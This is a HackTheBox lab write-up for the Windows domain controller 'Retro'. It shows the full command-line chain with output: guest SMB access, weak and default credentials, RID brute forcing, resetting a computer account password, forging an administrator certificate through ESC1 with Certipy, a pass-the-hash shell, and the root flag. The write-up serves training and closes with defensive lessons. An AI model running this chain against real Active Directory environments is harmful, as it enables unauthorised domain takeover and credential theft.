Retro

HackTheBox Writeup

Name: Retro

OS: Windows

Difficulty: Easy

IP Address: 10.129.234.44

Release Date: 24 June 2025

Points: 20

Summary

Retro is an easy Windows Active Directory machine that demonstrates several common misconfigurations in enterprise environments. The attack path consists of:

  1. Anonymous SMB enumeration revealing hints about weak credentials
  2. Exploiting a shared trainee account with a trivial password
  3. Discovering and exploiting a Pre-Windows 2000 computer account
  4. Abusing misconfigured Active Directory Certificate Services (ESC1)
  5. Gaining Domain Administrator access

Tool Overview

Before diving in, a quick explanation of the tools used:

  • Nmap — discovers open ports and running services. Flags: -sC (default scripts), -sV (versions), -T4 (timing), -p- (all ports).
  • NetExec (formerly CrackMapExec) — AD post-exploitation: test credentials and enumerate shares/users. Options: --shares, --rid-brute, -u, -p.
  • SMBClient — access SMB/CIFS shares. Commands: dir/ls, get <file>, cd.
  • Certipy — enumerate and abuse AD Certificate Services. Commands: find, req, auth.
  • Impacket (changepasswd.py) — change AD passwords over various protocols.
  • Evil-WinRM — PowerShell session over WinRM. Options: -i, -u, -H (pass-the-hash).

Analyzing the Scan Results

The open ports indicate this is a Windows Domain Controller (DNS, Kerberos, MSRPC, SMB, LDAP/LDAPS, RDP). Key findings: Domain retro.vl, Hostname DC, OS Windows Server 2022 (Build 20348), FQDN DC.retro.vl.

echo "10.129.234.44 DC.retro.vl retro.vl DC" | sudo tee -a /etc/hosts

Exploring the Trainees Share

smbclient //10.129.234.44/Trainees -U 'Guest'

Contents of Important.txt:

The note reveals a shared trainee account with a password that is probably trivial — likely the username itself.

Testing Credentials

netexec smb dc.retro.vl -u trainee -p trainee
SMB  10.129.234.44  445  DC  [+] retro.vl\trainee:trainee

Success! The credentials trainee:trainee are valid. With them we also gain access to the Notes share:

Privilege Escalation Path

User Enumeration via RID Brute Force

netexec smb dc.retro.vl -u guest -p '' --rid-brute
500: RETRO\Administrator  (SidTypeUser)
1000: RETRO\DC$           (SidTypeUser)
1104: RETRO\trainee       (SidTypeUser)
1106: RETRO\BANKING$      (SidTypeUser)
1107: RETRO\jburley       (SidTypeUser)
1109: RETRO\tblack        (SidTypeUser)

Key finding: RETRO\BANKING$ — this is the computer account the note was referring to!

Pre-Windows 2000 Computer Accounts

Pre-created computer accounts had a default password set to the computer name in lowercase, without the $ suffix. So for BANKING$ the default password would be banking.

netexec smb dc.retro.vl -u 'BANKING$' -p banking
SMB  ...  [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT

STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT actually confirms the password is correct — the account just is not activated for interactive logon. It differs from the STATUS_LOGON_FAILURE you would get with a wrong password.

Changing the BANKING$ Password

Since we cannot authenticate directly over SMB, we change the password over another protocol with Impacket's changepasswd.py:

python3 changepasswd.py -newpass 0xdf0xdf 'retro.vl/BANKING$:banking@dc.retro.vl' -protocol rpc-samr
[*] Password was changed successfully.

netexec smb dc.retro.vl -u 'BANKING$' -p 0xdf0xdf
SMB  ...  [+] retro.vl\BANKING$:0xdf0xdf

ADCS Exploitation (ESC1)

Enumerating Certificate Services

certipy find -u 'BANKING$@retro.vl' -p 0xdf0xdf -vulnerable -stdout
Certificate Templates
  Template Name         : RetroClients
  Client Authentication : True
  Enrollee Supplies Subject : True
  Enrollment Rights     : RETRO.VL\Domain Computers ...
  Minimum RSA Key Length : 4096
  [!] Vulnerabilities
    ESC1 : 'RETRO.VL\Domain Computers' can enroll, enrollee supplies
           subject and template allows client authentication

Understanding ESC1

ESC1 lets the requester supply the subject (Enrollee Supplies Subject = True), the cert allows Client Authentication, and low-privileged users (Domain Computers) can enroll. As BANKING$ we can request a certificate claiming to be for "administrator" and authenticate as them.

Requesting a Certificate

First attempt fails on key size (the template requires 4096 bits, Certipy defaults to 2048). We add -key-size 4096, then include the administrator SID (domain SID + RID 500):

certipy req -u 'BANKING$@retro.vl' -p 0xdf0xdf -ca retro-DC-CA -template RetroClients \
  -upn administrator@retro.vl -sid S-1-5-21-2983547755-698260136-4283918172-500 -key-size 4096
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saved certificate and private key to 'administrator.pfx'

Authenticating with the Certificate

certipy auth -pfx administrator.pfx -dc-ip 10.129.234.44
[*] Got hash for 'administrator@retro.vl':
aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389

Getting an Administrator Shell

evil-winrm -i dc.retro.vl -u administrator -H 252fac7066d93dd009d4fd2cd0368389
*Evil-WinRM* PS C:\Users\Administrator\Documents>

Retrieving the Root Flag

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
40fce9c3f09024bcab29d377ee1ed071

Lessons Learned

  • Disable guest access to SMB shares and enforce strong passwords, even for shared accounts.
  • Remove or properly secure Pre-Windows 2000 computer accounts.
  • Regularly audit ADCS certificate templates for ESC vulnerabilities.
  • Notes and README files often contain valuable information.
  • Read error messages carefully — key size and SID requirements both mattered here.
